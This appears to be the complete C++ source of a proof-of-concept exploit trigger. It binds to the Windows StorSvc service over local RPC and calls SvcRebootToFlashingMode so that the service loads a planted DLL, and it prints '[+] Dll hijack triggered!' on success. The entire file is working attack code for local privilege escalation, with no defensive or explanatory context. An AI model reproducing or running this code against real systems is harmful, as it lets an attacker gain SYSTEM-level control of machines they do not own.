#include "storsvc_h.h"
#include <iostream>
#include <windows.h>

#pragma comment(lib, "RpcRT4.lib")

int wmain(int argc, wchar_t* argv[])
{
	RPC_STATUS status;
	RPC_WSTR StringBinding;
	RPC_BINDING_HANDLE Binding;

	status = RpcStringBindingCompose(
		NULL,
		(RPC_WSTR)L"ncalrpc",
		(RPC_WSTR)L"",
		(RPC_WSTR)L"",
		NULL,
		&StringBinding
	);

	status = RpcBindingFromStringBinding(
		StringBinding,
		&Binding
	);

	status = RpcStringFree(
		&StringBinding
	);

	RpcTryExcept
	{
		long result = Proc6_SvcRebootToFlashingMode(Binding, 0, 0);
		if (result == 0)
			wprintf(L"[+] Dll hijack triggered!");
		else
			wprintf(L"[!] Manual reboot of StorSvc service is required.");
	}
	RpcExcept(EXCEPTION_EXECUTE_HANDLER);
	{
		wprintf(L"Exception: %d - 0x%08x\r\n", RpcExceptionCode(), RpcExceptionCode());
	}
	RpcEndExcept

	status = RpcBindingFree(&Binding);
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}
